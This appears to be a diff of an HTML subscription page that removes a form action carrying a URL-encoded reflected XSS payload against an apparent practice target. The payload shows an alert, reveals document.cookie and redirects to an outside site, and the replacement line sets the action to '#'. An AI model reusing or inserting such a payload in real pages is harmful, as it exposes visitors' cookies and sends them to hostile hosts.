@@ -7,7 +7,7 @@
 <body>
     <script src="analytics.js">
     </script>
-<form action=http://sudo.co.il/xss/level0.php?email=%3Cscript%3E%20alert(%27This%20is%20XSS%20is%20crafted%20by%20pravin%20shinde%27);%20if%20(window.confirm(document.cookie)){%20document.location.href%20=%20%22http://blackhat.com%22;%20}%20%3C/script%3E method="get">
+<form action=# method="get">
 <input type="text" name="email"><input type="submit" value="Subscribe!">
 </form>
 Thank you for subscription!<br>
